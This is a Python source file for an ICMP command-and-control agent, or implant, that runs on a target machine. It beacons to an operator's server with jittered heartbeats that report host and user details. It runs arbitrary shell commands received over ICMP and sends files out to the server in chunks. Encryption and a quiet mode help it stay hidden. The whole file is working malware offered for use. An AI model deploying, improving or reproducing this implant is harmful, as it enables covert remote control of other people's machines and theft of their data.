#!/usr/bin/env python3
"""
icmp_agent_v2.py — ICMP C2 Agent / Implant 

Runs on the target machine. Connects back to the command server via ICMP.

Fixes every issue in the original listener:

  ✓ Server IP via CLI argument (no hardcoded SERVER_IP)
  ✓ Shared protocol library (icmp_protocol.py)
  ✓ Binary framing (struct.pack, not fragile colon-delimited strings)
  ✓ Proper chunk reassembly for received commands
  ✓ File upload/download over ICMP
  ✓ Jittered heartbeat interval (60s ± 15s)
  ✓ System info reported on first heartbeat
  ✓ Thread-safe chunk buffers
  ✓ Quiet mode available

Usage:
    python icmp_agent_v2.py -i eth0 -s 192.168.1.100
    python icmp_agent_v2.py -i eth0 -s 10.0.0.1 --encrypt --key <key>
    python icmp_agent_v2.py -i eth0 -s 10.0.0.1 --quiet --daemon
"""

from __future__ import annotations

import argparse
import os
import platform
import random
import subprocess
import sys
import threading
import time
from typing import Dict, Optional
from pathlib import Path

from scapy.all import IP, ICMP, Raw, send, sniff, sr1, conf

# Suppress Scapy noise
conf.verb = 0

from icmp_protocol import (
    DEFAULT_CHUNK_SIZE,
    DEFAULT_ICMP_ID,
    DEFAULT_TTL,
    HEARTBEAT_INTERVAL,
    HEARTBEAT_JITTER,
    MAX_FILE_SIZE,
    ChunkAssembler,
    Codec,
    FileTransfer,
    MsgType,
    jittered_sleep,
    pack_frame,
    status_err,
    status_ok,
    unpack_frame,
)



# Agent

class ICMPAgent:
    """
    ICMP C2 Agent — runs on target, connects back to C2 server.

    Capabilities:
      - Execute shell commands
      - Upload files to server
      - Download files from server
      - Report system information
      - Process listing
      - Directory listing
      - File read
    """

    def __init__(self, interface: str, server_ip: str,
                 icmp_id: int = DEFAULT_ICMP_ID,
                 ttl: int = DEFAULT_TTL,
                 chunk_size: int = DEFAULT_CHUNK_SIZE,
                 codec: Optional[Codec] = None,
                 quiet: bool = False):
        self.interface = interface
        self.server_ip = server_ip
        self.icmp_id = icmp_id
        self.ttl = ttl
        self.chunk_size = chunk_size
        self.codec = codec or Codec()
        self.quiet = quiet
        self.running = True
        self.seq = 0

        # Subsystems
        self.assembler = ChunkAssembler()
        self.transfers: Dict[str, FileTransfer] = {}
        self.transfer_lock = threading.Lock()
        self._out_lock = threading.Lock()

        # System info
        self._sysinfo = self._gather_sysinfo()

    # ---- Output ----
    def _log(self, *args, **kwargs):
        if not self.quiet:
            with self._out_lock:
                print(*args, **kwargs, file=sys.stderr, flush=True)

    def _ok(self, msg: str):
        self._log(f"[+] {msg}")

    def _err(self, msg: str):
        self._log(f"[-] {msg}")

    # ---- System info ----
    def _gather_sysinfo(self) -> str:
        """Gather basic system information for heartbeat payload."""
        try:
            hostname = platform.node()
        except Exception:
            hostname = "unknown"

        try:
            user = os.getlogin()
        except Exception:
            user = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))

        try:
            os_name = f"{platform.system()} {platform.release()}"
        except Exception:
            os_name = platform.system()

        # Format: hostname|user|os
        return f"{hostname}|{user}|{os_name}"

    # ---- Low-level send ----
    def _send_raw(self, msg_type: MsgType, payload: bytes):
        """Send a framed payload to the C2 server."""
        framed = pack_frame(msg_type, 0, 1, payload)

        if len(framed) <= self.chunk_size:
            pkt = (IP(dst=self.server_ip, ttl=self.ttl) /
                   ICMP(type=8, id=self.icmp_id, seq=self.seq) /
                   Raw(load=framed))
            send(pkt, verbose=0)
            self.seq = (self.seq + 1) % 65535
            return

        # Multi-chunk
        total = (len(framed) + self.chunk_size - 1) // self.chunk_size
        for i in range(total):
            chunk = framed[i * self.chunk_size:(i + 1) * self.chunk_size]
            chunk_framed = pack_frame(msg_type, i, total, chunk)
            pkt = (IP(dst=self.server_ip, ttl=self.ttl) /
                   ICMP(type=8, id=self.icmp_id, seq=self.seq) /
                   Raw(load=chunk_framed))
            send(pkt, verbose=0)
            self.seq = (self.seq + 1) % 65535
            time.sleep(0.05)

    def _send_response(self, payload: bytes):
        """Send a command response back to the server."""
        encoded = self.codec.encode_payload(payload)
        self._send_raw(MsgType.RESPONSE, encoded)

    def _send_error(self, message: str):
        """Send an error message to the server."""
        encoded = self.codec.encode_text(message)
        self._send_raw(MsgType.ERROR, encoded)

    def _send_heartbeat(self):
        """Send heartbeat with system info."""
        payload = self.codec.encode_text(self._sysinfo)
        self._send_raw(MsgType.HEARTBEAT, payload)

    # ---- Heartbeat loop ----
    def _heartbeat_loop(self):
        """Background thread: send periodic heartbeats with jitter."""
        # Send initial heartbeat immediately
        self._send_heartbeat()
        self._log(f"♥ Initial heartbeat → {self.server_ip}")

        while self.running:
            jittered_sleep(HEARTBEAT_INTERVAL, HEARTBEAT_JITTER)
            if self.running:
                self._send_heartbeat()
                self._log(f"♥ Heartbeat → {self.server_ip}")

    # ---- Command execution ----
    def execute(self, command: str) -> bytes:
        """
        Execute a command. Supports built-in commands and shell execution.

        Built-in commands:
            sysinfo     — Return system information
            ps          — List running processes
            ls <path>   — List directory
            cat <file>  — Read file contents
            download    — Send file to server
            exit        — Terminate agent
        """
        parts = command.strip().split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd == "sysinfo":
            info = {
                "hostname": platform.node(),
                "os": f"{platform.system()} {platform.release()}",
                "arch": platform.machine(),
                "python": sys.version,
                "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
                "cwd": os.getcwd(),
            }
            return status_ok(info) + b"\n"

        if cmd == "ps":
            return self._list_processes()

        if cmd == "ls":
            path = arg if arg else "."
            return self._list_dir(path)

        if cmd == "cat":
            if not arg:
                return status_err("Usage: cat <filepath>") + b"\n"
            return self._read_file(arg)

        if cmd == "download":
            if not arg:
                return status_err("Usage: download <filepath>") + b"\n"
            self._upload_file_to_server(arg)
            return f"[*] Uploading {arg} to server...\n".encode()

        if cmd == "exit":
            self._log("Exit command received. Shutting down.")
            self.running = False
            return b"[*] Agent shutting down.\n"

        # Default: shell execution
        return self._shell_exec(command)

    def _shell_exec(self, command: str) -> bytes:
        """Execute an arbitrary shell command."""
        try:
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate(timeout=30)
            result = stdout + stderr
            if not result:
                result = f"(exit code: {proc.returncode})\n".encode()
            return result
        except subprocess.TimeoutExpired:
            return status_err("Command timed out (30s)") + b"\n"
        except Exception as e:
            return status_err(str(e)) + b"\n"

    def _list_processes(self) -> bytes:
        """List running processes (cross-platform)."""
        try:
            if sys.platform == "win32":
                result = subprocess.check_output(
                    "tasklist /FO CSV /NH", shell=True, timeout=10
                )
            else:
                result = subprocess.check_output(
                    "ps aux --no-headers 2>/dev/null || ps aux", shell=True, timeout=10
                )
            return result
        except Exception as e:
            return status_err(str(e)) + b"\n"

    def _list_dir(self, path: str) -> bytes:
        """List directory contents."""
        try:
            if sys.platform == "win32":
                result = subprocess.check_output(
                    f"dir \"{path}\"", shell=True, timeout=10
                )
            else:
                result = subprocess.check_output(
                    f"ls -la \"{path}\"", shell=True, timeout=10
                )
            return result
        except Exception as e:
            return status_err(str(e)) + b"\n"

    def _read_file(self, path: str) -> bytes:
        """Read a file and return contents."""
        try:
            p = Path(path)
            if not p.exists():
                return status_err(f"File not found: {path}") + b"\n"
            if p.stat().st_size > MAX_FILE_SIZE:
                return status_err(f"File too large (> {MAX_FILE_SIZE // 1024 // 1024}MB)") + b"\n"
            return p.read_bytes()
        except Exception as e:
            return status_err(str(e)) + b"\n"

    def _upload_file_to_server(self, filepath: str):
        """Send a file to the C2 server via ICMP chunks."""
        p = Path(filepath)
        if not p.exists():
            self._send_error(f"File not found: {filepath}")
            return

        size = p.stat().st_size
        if size > MAX_FILE_SIZE:
            self._send_error(f"File too large: {size:,} bytes")
            return

        self._log(f"Uploading {p.name} ({size:,} bytes) → {self.server_ip}")

        # Announce
        meta = f"{p.name}|{size}".encode()
        self._send_raw(MsgType.FILE_START, self.codec.encode_payload(meta))

        # Send chunks
        chunk_data_size = self.chunk_size - 128
        with open(filepath, "rb") as f:
            i = 0
            while True:
                chunk = f.read(chunk_data_size)
                if not chunk:
                    break
                self._send_raw(MsgType.FILE_CHUNK, self.codec.encode_payload(chunk))
                i += 1
                if i % 50 == 0:
                    self._log(f"  Sent {i} chunks...")
                time.sleep(0.01)

        # Done
        self._send_raw(MsgType.FILE_END, b"")
        self._ok(f"Uploaded {p.name} ({i} chunks)")

    # ---- File download handler (server → agent) ----
    def _handle_file_start(self, payload: bytes):
        """Server is sending us a file."""
        try:
            meta = self.codec.decode_payload(payload).decode("utf-8", errors="replace")
            fname, size_str = meta.split("|", 1)
            size = int(size_str)
            tid = f"{fname}:{int(time.time())}"

            with self.transfer_lock:
                self.transfers[tid] = FileTransfer(
                    transfer_id=tid, filename=fname, total_size=size
                )

            self._log(f"Incoming file: {fname} ({size:,} bytes)")

            # Prepare output directory
            os.makedirs("incoming", exist_ok=True)
            outpath = os.path.join("incoming", fname)
            # Truncate if exists
            open(outpath, "wb").close()

        except Exception as e:
            self._err(f"File start error: {e}")

    def _handle_file_chunk(self, payload: bytes):
        """Receive a file chunk from server."""
        try:
            data = self.codec.decode_payload(payload)
            with self.transfer_lock:
                active = None
                for tid, t in self.transfers.items():
                    if not t.complete:
                        active = t
                        break

                if active is None:
                    self._err("No active download transfer")
                    return

                with active.lock:
                    active.received += len(data)

                outpath = os.path.join("incoming", active.filename)
                with open(outpath, "ab") as f:
                    f.write(data)

        except Exception as e:
            self._err(f"File chunk error: {e}")

    def _handle_file_end(self, payload: bytes):
        """File download from server complete."""
        with self.transfer_lock:
            active = None
            for tid, t in list(self.transfers.items()):
                if not t.complete:
                    active = t
                    del self.transfers[tid]
                    break

        if active:
            outpath = os.path.join("incoming", active.filename)
            self._ok(f"Downloaded {active.filename} ({active.received:,} bytes) → {outpath}")

    # ---- Packet processor ----
    def _process_packet(self, pkt):
        """Scapy callback — runs in sniffer thread. Handles incoming commands."""
        try:
            if not (pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw)):
                return
            if pkt[IP].src != self.server_ip:
                return
            if pkt[ICMP].id != self.icmp_id:
                return

            raw = bytes(pkt[Raw].load)

            # Unpack binary frame
            try:
                msg_type, chunk_idx, total, payload = unpack_frame(raw)
            except ValueError:
                # Legacy format — ignore
                return

            # Multi-chunk reassembly
            if total > 1:
                full = self.assembler.feed("cmd", chunk_idx, total, payload)
                if full is None:
                    return
                payload = full
                self.assembler.clear("cmd")

            # Dispatch by message type
            if msg_type == MsgType.COMMAND:
                command = self.codec.decode_payload(payload).decode("utf-8", errors="replace")
                self._log(f"← CMD: {command}")
                result = self.execute(command)
                if result:
                    self._send_response(result)

            elif msg_type == MsgType.FILE_START:
                self._handle_file_start(payload)

            elif msg_type == MsgType.FILE_CHUNK:
                self._handle_file_chunk(payload)

            elif msg_type == MsgType.FILE_END:
                self._handle_file_end(payload)

            elif msg_type == MsgType.ACK:
                pass  # Acknowledgment from server

        except Exception as e:
            self._err(f"Packet processing error: {e}")

    # ---- Start ----
    def start(self):
        """Start the agent — heartbeat + sniffer."""
        self._log("  ╔══════════════════════════════════════════════╗")
        self._log("  ║    ICMP C2 AGENT v2                            ║")
        self._log("  ╚══════════════════════════════════════════════╝")
        self._log(f"  Interface:  {self.interface}")
        self._log(f"  Server:     {self.server_ip}")
        self._log(f"  ICMP ID:    {self.icmp_id} (0x{self.icmp_id:04X})")
        self._log(f"  Encryption: {'ON' if self.codec.encrypt else 'OFF'}")
        self._log(f"  System:     {self._sysinfo}")

        # Start heartbeat thread
        hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        hb_thread.start()

        # Start sniffer (main thread — blocks)
        self._log("\n  Listening for commands... (Ctrl+C to stop)\n")

        try:
            sniff(iface=self.interface, prn=self._process_packet,
                  filter=f"icmp and src host {self.server_ip}", store=0,
                  stop_filter=lambda _: not self.running)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            self._err(f"Sniffer error: {e}")
        finally:
            self.running = False
            self._log("\n[*] Agent stopped.")



# Network interface discovery (kept from original for usability)

def get_interfaces() -> list:
    """Auto-discover available network interfaces."""
    try:
        from scapy.all import get_if_list
        return get_if_list()
    except Exception:
        pass

    try:
        import netifaces
        return netifaces.interfaces()
    except ImportError:
        pass

    # Fallback
    if sys.platform == "win32":
        try:
            result = subprocess.run(
                ["netsh", "interface", "show", "interface"],
                capture_output=True, text=True, timeout=5
            )
            interfaces = []
            for line in result.stdout.split("\n"):
                if "Connected" in line or "Disconnected" in line:
                    parts = line.split()
                    if len(parts) > 3:
                        interfaces.append(parts[-1])
            return interfaces or ["eth0"]
        except Exception:
            pass

    return ["eth0", "wlan0", "lo", "en0"]


def show_interfaces():
    """Display available interfaces."""
    print("\n  Available Network Interfaces:")
    print("  " + "=" * 40)
    for i, iface in enumerate(get_interfaces(), 1):
        print(f"  {i:2d}. {iface}")
    print("  " + "=" * 40)



# CLI

def main():
    parser = argparse.ArgumentParser(
        description="ICMP C2 Agent v2 — Runs on target, connects to C2 server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python icmp_agent_v2.py -i eth0 -s 192.168.1.100
  python icmp_agent_v2.py -i eth0 -s 10.0.0.1 --encrypt --key <key>
  python icmp_agent_v2.py -i eth0 -s 10.0.0.1 --quiet
  python icmp_agent_v2.py --show-interfaces
        """
    )
    parser.add_argument("-i", "--interface", type=str,
                        help="Network interface to use")
    parser.add_argument("-s", "--server", type=str,
                        help="C2 server IP address")
    parser.add_argument("--icmp-id", type=int, default=DEFAULT_ICMP_ID,
                        help=f"ICMP ID (default: {DEFAULT_ICMP_ID})")
    parser.add_argument("--ttl", type=int, default=DEFAULT_TTL,
                        help=f"IP TTL (default: {DEFAULT_TTL})")
    parser.add_argument("--chunk-size", type=int, default=DEFAULT_CHUNK_SIZE,
                        help=f"Max chunk size (default: {DEFAULT_CHUNK_SIZE})")
    parser.add_argument("--encoding", choices=["plain", "base64", "hex"],
                        default="plain", help="Data encoding method")
    parser.add_argument("--compress", action="store_true",
                        help="Enable zlib compression")
    parser.add_argument("--encrypt", action="store_true",
                        help="Enable Fernet encryption")
    parser.add_argument("--key", type=str,
                        help="Fernet encryption key")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Suppress info messages")
    parser.add_argument("--show-interfaces", action="store_true",
                        help="Show available interfaces and exit")

    args = parser.parse_args()

    if args.show_interfaces:
        show_interfaces()
        return

    if not args.server:
        parser.error("--server / -s is required (C2 server IP)")
    if not args.interface:
        parser.error("--interface / -i is required")
    if args.encrypt and not args.key:
        parser.error("--encrypt requires --key")

    codec = Codec(
        encoding=args.encoding,
        compress=args.compress,
        encrypt=args.encrypt,
        key=args.key,
    )

    agent = ICMPAgent(
        interface=args.interface,
        server_ip=args.server,
        icmp_id=args.icmp_id,
        ttl=args.ttl,
        chunk_size=args.chunk_size,
        codec=codec,
        quiet=args.quiet,
    )
    agent.start()


if __name__ == "__main__":
    main()
